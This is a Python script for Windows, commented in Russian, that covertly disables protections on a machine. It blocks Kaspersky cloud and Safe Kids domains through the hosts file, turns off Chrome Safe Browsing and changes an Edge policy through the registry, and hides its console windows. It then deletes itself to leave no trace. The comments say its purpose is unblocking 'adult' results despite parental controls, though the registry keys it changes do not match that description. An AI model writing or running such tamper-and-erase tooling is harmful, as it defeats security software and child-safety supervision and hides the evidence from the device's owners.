import os
import sys
import ctypes
import subprocess
import time

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def bypass_kaspersky():
    # 1. Блокируем связь с облаком классификации сайтов (KSN)
    # Перенаправляем скрипты проверки Касперского на localhost
    hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
    blocked_domains = [
        "gc.kis.v2.scr.kaspersky-labs.com",
        "ksn.kaspersky.com",
        "kids.kaspersky.com"
    ]
    
    try:
        with open(hosts_path, "a") as f:
            for domain in blocked_domains:
                f.write(f"\n127.0.0.1 {domain}")
    except Exception as e:
        pass

    # 2. Отключаем принудительный безопасный поиск (SafeSearch) через реестр
    # Это разблокирует "взрослые" результаты в Google/Yandex
    commands = [
        r'reg add "HKLM\SOFTWARE\Policies\Google\Chrome" /v "SafeBrowsingEnabled" /t REG_DWORD /d 0 /f',
        r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "InPrivateModeAvailability" /t REG_DWORD /d 0 /f',
        'ipconfig /flushdns',
        'netsh winhttp reset proxy'
    ]
    
    for cmd in commands:
        subprocess.run(cmd, shell=True, capture_output=True, creationflags=0x08000000)

def self_destruct():
    # Скрипт переименовывается и удаляется через CMD после завершения
    file_path = os.path.realpath(__file__)
    folder = os.path.dirname(file_path)
    temp_name = os.path.join(folder, "cache_tmp.db")
    
    try:
        os.rename(file_path, temp_name)
        # Команда на удаление через 2 секунды
        subprocess.Popen(f'cmd /c timeout /t 2 > nul && del /f /q "{temp_name}"', 
                         shell=True, creationflags=0x08000000)
    except:
        pass

if __name__ == "__main__":
    if not is_admin():
        # Если нет прав админа, выходим (для правки hosts они нужны)
        sys.exit()

    bypass_kaspersky()
    self_destruct()
